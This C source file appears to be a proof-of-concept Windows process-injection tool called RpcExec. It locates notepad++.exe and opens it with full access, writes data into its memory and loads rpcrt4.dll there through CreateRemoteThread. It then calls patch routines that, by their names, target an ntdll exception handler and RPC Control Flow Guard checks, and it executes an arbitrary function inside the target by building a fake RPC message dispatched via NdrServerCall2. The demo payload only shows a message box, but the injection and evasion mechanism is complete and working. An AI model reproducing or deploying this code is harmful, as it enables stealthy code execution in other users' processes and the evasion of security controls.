#include <stdio.h>
#include <windows.h>
#include <rpcdce.h>
#include <rpcndr.h>
#include <intrin.h>
#include "RpcExec.h"
#include "CreateProcess.h"
#include "Patcher.h"

#pragma comment(lib, "rpcrt4.lib")

// OFFSETS relative to Windows 11 24H
#define RPC_INIT_OFFSET 0x759c
#define RPC_INVOKE_OFFSET 0x677f0

void CraftRpcMessage(
	HANDLE hProcess,
    void* arguments_address,
    void* function_address
) {
    __try {
        // InitializeHeapManager
        InitializeHeapManager(hProcess);

        RPC_MESSAGE* rpc_message = (RPC_MESSAGE*)HeapManagerAlloc(sizeof(RPC_MESSAGE));
        RPC_DISPATCH_TABLE* rpc_dispatch_table = (RPC_DISPATCH_TABLE*)HeapManagerAlloc(sizeof(RPC_DISPATCH_TABLE));
        MIDL_STUB_DESC* midl_stub_desc = (MIDL_STUB_DESC*)HeapManagerAlloc(sizeof(MIDL_STUB_DESC));
        MIDL_SERVER_INFO* midl_server_info = (MIDL_SERVER_INFO*)HeapManagerAlloc(sizeof(MIDL_SERVER_INFO));
        RPC_CLIENT_INTERFACE* rpc_client_interface = (RPC_CLIENT_INTERFACE*)HeapManagerAlloc(sizeof(RPC_CLIENT_INTERFACE));
        RPC_SYNTAX_IDENTIFIER* rpc_syntax_identifier = (RPC_SYNTAX_IDENTIFIER*)HeapManagerAlloc(sizeof(RPC_SYNTAX_IDENTIFIER));
        RPC_VERSION* rpc_version = (RPC_VERSION*)HeapManagerAlloc(sizeof(RPC_VERSION));
        unsigned short* MyInterface_FormatStringOffsetTable = (unsigned short*)HeapManagerAlloc(sizeof(unsigned short));
		void* rpc_arguments = HeapManagerAlloc(sizeof(ARGUMENTS));
		void* rpc_function = HeapManagerAlloc(sizeof(UINT64));

        BYTE* proc_string = (BYTE*)HeapManagerAlloc(256);

        BYTE stack_string[] = {
                0x32, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x68, 0x00, 0xc0, 0x00, 0x10, 0x00, 0x44,
                0x0d, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00,
                0x0b, 0x00, 0x48, 0x00, 0x08, 0x00, 0x0b, 0x00, 0x48, 0x00, 0x10, 0x00, 0x0b, 0x00, 0x48,
                0x00, 0x18, 0x00, 0x0b, 0x00, 0x48, 0x00, 0x20, 0x00, 0x0b, 0x00, 0x48, 0x00, 0x28, 0x00,
                0x0b, 0x00, 0x48, 0x00, 0x30, 0x00, 0x0b, 0x00, 0x48, 0x00, 0x38, 0x00, 0x0b, 0x00, 0x48,
                0x00, 0x40, 0x00, 0x0b, 0x00, 0x48, 0x00, 0x48, 0x00, 0x0b, 0x00, 0x48, 0x00, 0x50, 0x00,
                0x0b, 0x00, 0x48, 0x00, 0x58, 0x00, 0x0b, 0x00, 0x70, 0x00, 0x60, 0x00, 0x0b, 0x00, 0x00
        };

        // Check all for null
        if (rpc_message == NULL || rpc_dispatch_table == NULL || midl_stub_desc == NULL || midl_server_info == NULL || rpc_client_interface == NULL || rpc_syntax_identifier == NULL || rpc_version == NULL || proc_string == NULL) {
            printf("Failed to allocate memory for RPC Message\n");
            return;
        }

        /*
        // Print all addresses and the var name
        printf("rpc_message: %p\n", rpc_message);
        printf("rpc_dispatch_table: %p\n", rpc_dispatch_table);
        printf("midl_stub_desc: %p\n", midl_stub_desc);
        printf("midl_server_info: %p\n", midl_server_info);
        printf("rpc_client_interface: %p\n", rpc_client_interface);
        printf("rpc_syntax_identifier: %p\n", rpc_syntax_identifier);
        printf("rpc_version: %p\n", rpc_version);
        printf("proc_string: %p\n", proc_string);
		printf("MyInterface_FormatStringOffsetTable: %p\n", MyInterface_FormatStringOffsetTable);
		printf("rpc_arguments: %p\n", rpc_arguments);
		printf("rpc_function: %p\n", rpc_function);
		printf("function_address: %p\n", function_address);
        */

        HeapManagerCopy(proc_string, stack_string, sizeof(stack_string));
        HeapManagerCopy(rpc_arguments, arguments_address, sizeof(ARGUMENTS));
		printf("[*] Arguments copied\n");

		HeapManagerWriteQWORD(rpc_function, (UINT64)function_address);

		HeapManagerWriteDWORD(&rpc_dispatch_table->DispatchTableCount, 1);
		HeapManagerWriteQWORD(&rpc_dispatch_table->DispatchTable, (UINT64)rpc_function);

		HeapManagerWriteWORD(&rpc_syntax_identifier->SyntaxVersion.MajorVersion, 2);

        HeapManagerWriteDWORD(&midl_stub_desc->Version, 0x50002);
		HeapManagerWriteDWORD(&midl_stub_desc->MIDLVersion, 0x800025b);
		HeapManagerWriteQWORD(&midl_stub_desc->mFlags, 1);
		HeapManagerWriteDWORD(&midl_stub_desc->fCheckBounds, 1);
		HeapManagerWriteQWORD(&midl_stub_desc->RpcInterfaceInformation, (UINT64)rpc_client_interface);

		HeapManagerWriteQWORD(&midl_server_info->pStubDesc, (UINT64)midl_stub_desc);

		HeapManagerWriteQWORD(&midl_server_info->DispatchTable, (UINT64)rpc_function);
		HeapManagerWriteQWORD(&midl_server_info->ProcString, (UINT64)proc_string);
		HeapManagerWriteQWORD(&midl_server_info->FmtStringOffset, (UINT64)MyInterface_FormatStringOffsetTable);

		HeapManagerWriteDWORD(&rpc_client_interface->Length, sizeof(RPC_CLIENT_INTERFACE));

		HeapManagerWriteWORD(&rpc_client_interface->InterfaceId.SyntaxVersion.MajorVersion, 1);
		HeapManagerWriteWORD(&rpc_client_interface->TransferSyntax.SyntaxVersion.MajorVersion, 2);
		HeapManagerWriteDWORD(&rpc_client_interface->Flags, 0x4000000);
		HeapManagerWriteQWORD(&rpc_client_interface->DispatchTable, (UINT64)rpc_dispatch_table);
		HeapManagerWriteQWORD(&rpc_client_interface->InterpreterInfo, (UINT64)midl_server_info);

		//HeapManagerWriteQWORD(&rpc_message->Handle, (UINT64)rpcBindingHandle);
		HeapManagerWriteQWORD(&rpc_message->Handle, NULL);
		HeapManagerWriteDWORD(&rpc_message->RpcFlags, 0x1000);
		HeapManagerWriteDWORD(&rpc_message->DataRepresentation, 0x10);
		HeapManagerWriteQWORD(&rpc_message->RpcInterfaceInformation, (UINT64)rpc_client_interface);
		HeapManagerWriteQWORD(&rpc_message->Buffer, (UINT64)rpc_arguments);
		HeapManagerWriteDWORD(&rpc_message->BufferLength, sizeof(ARGUMENTS));

        /*
        DWORD threadID;
        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)RpcExceptionFilter, (LPVOID)0x000006a6, 0, &threadID);
        if (NULL == hThread) {
            printf("[-] Could not execute thread!\n");
            goto cleanup;
        }
        else {
            printf("[+] Started thread %i\n", threadID);
        }
        WaitForSingleObject(hThread, INFINITE);
        */


        DWORD threadID;
        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)NdrServerCall2, rpc_message, 0, &threadID);
        if (NULL == hThread) {
            printf("[-] Could not execute thread!\n");
            goto cleanup;
        }
        else {
            printf("[+] Started thread %i\n", threadID);
        }
        WaitForSingleObject(hThread, INFINITE);
    }
	__except (EXCEPTION_EXECUTE_HANDLER) {
		printf("Exception\n");
	}
cleanup:
    HeapManagerFree(hProcess);

}

BOOL RemoteRpcInit(HANDLE hProcess) {
    HMODULE hRpcRt4 = LoadLibraryA("rpcrt4.dll");
	if (hRpcRt4 == NULL)
	{
		printf("[-] Failed to load rpcrt4.dll\n");
		return FALSE;
	}

    FARPROC RpcInit = (FARPROC)GetProcAddress(hRpcRt4, "PerformRpcInitialization");
    if (RpcInit == NULL)
    {
        printf("[-] Failed to get PerformRpcInitialization function address: %08x\n", GetLastError());
        RpcInit = (FARPROC)((UINT64)hRpcRt4 + RPC_INIT_OFFSET);
        printf("[*] Using hardcoded offset address: 0x%llx\n", (ULONGLONG)RpcInit);
    }

    __try {
        DWORD threadID;
        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)RpcInit, NULL, 0, &threadID);
        if (NULL == hThread) {
            printf("[-] Could not execute thread!\n");
            return FALSE;
        }
        else {
            printf("[+] Started thread %i\n", threadID);
        }
        WaitForSingleObject(hThread, INFINITE);
		return TRUE;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        printf("[-] Exception\n");
        return FALSE;
    }
	return FALSE;
}

BOOL RemoteLoadRpc(HANDLE hProcess) {
	BOOL bSuccss = FALSE;
    // InitializeHeapManager
    InitializeHeapManager(hProcess);

	const char libName[] = "rpcrt4.dll";
	void* libNameAddress = HeapManagerAlloc(sizeof(libName));

	HeapManagerCopy(libNameAddress, (void*)libName, sizeof(libName));

	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, libNameAddress, 0, NULL);
	if (NULL == hThread) {
		printf("[-] Could not execute thread!\n");
		goto cleanup;
	}
	else {
		printf("[+] Started thread\n");
	}
	WaitForSingleObject(hThread, INFINITE);
    bSuccss = TRUE;

cleanup:
	if (hThread != NULL) {
		CloseHandle(hThread);
	}
	HeapManagerFree(hProcess);
	return bSuccss;
}


int main() {
   
    HMODULE hMod = LoadLibraryA("kernelbase.dll");
    HMODULE hRpcRt4 = LoadLibraryA("rpcrt4.dll");
    HMODULE hU32 = LoadLibraryA("user32.dll");

    if (hMod == NULL || hRpcRt4 == NULL || hU32 == NULL)
    {
        printf("[-] Failed to load DLLs\n");
        return 1;
    }

    FARPROC targetFunction = GetProcAddress(hU32, "MessageBoxA");
    if (targetFunction == NULL)
    {
        printf("[-] Failed to get MessageBoxA function address: %08x\n", GetLastError());
        return 1;
    }
    printf("[*] Function `MessageBoxA` address: 0x%llx\n", (ULONGLONG)targetFunction);

    PARGUMENTS arguments_address = (PARGUMENTS)malloc(sizeof(ARGUMENTS));
    if (arguments_address == NULL) {
        printf("Failed to allocate memory for arguments\n");
        return 1;
    }
    memset(arguments_address, 0, sizeof(ARGUMENTS));

	DWORD pid = GetProcessIdByName(L"notepad++.exe");
    if (pid == -1)
    {
		printf("[-] Failed to create process\n");
		return 1;
    }
    printf("[+] Found process with PID: %d\n", pid);
	
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProcess == NULL) {
		printf("[-] Failed to open process\n");
		return 1;
	}

    LPVOID title_text = VirtualAllocEx(hProcess, NULL, 0x1000, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);

    if (title_text == NULL) {
        printf("Failed to allocate memory for title and text\n");
        return 1;
    }
	SIZE_T bytes_written;
    WriteProcessMemory(hProcess, title_text, "Hello from RpcExec!", 20, &bytes_written);
    WriteProcessMemory(hProcess, (LPVOID)((UINT64)title_text+0x100), "RpcExec ", 9, &bytes_written);

    arguments_address->arg1 = 0;
    arguments_address->arg2 = (UINT64)title_text;
    arguments_address->arg3 = ((UINT64)title_text + 0x100);
    arguments_address->arg4 = 0;
	printf("[*] Arguments address: 0x%llx\n", (ULONGLONG)arguments_address);
	printf("[*] Title address: 0x%llx\n", (ULONGLONG)title_text);
	printf("[*] Text address: 0x%llx\n", (ULONGLONG)title_text + 0x100);

	RemoteLoadRpc(hProcess);
	RemoteRpcInit(hProcess);
    NtdllExceptionPatch(hProcess);
    PatchRpcCfg(hProcess);

    for (int i = 0; i < 3; i++) {
        __try {
            CraftRpcMessage(hProcess, arguments_address, targetFunction);
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            printf("[-] Exception\n");
        }
    }

    free(arguments_address);

    return 0;
}
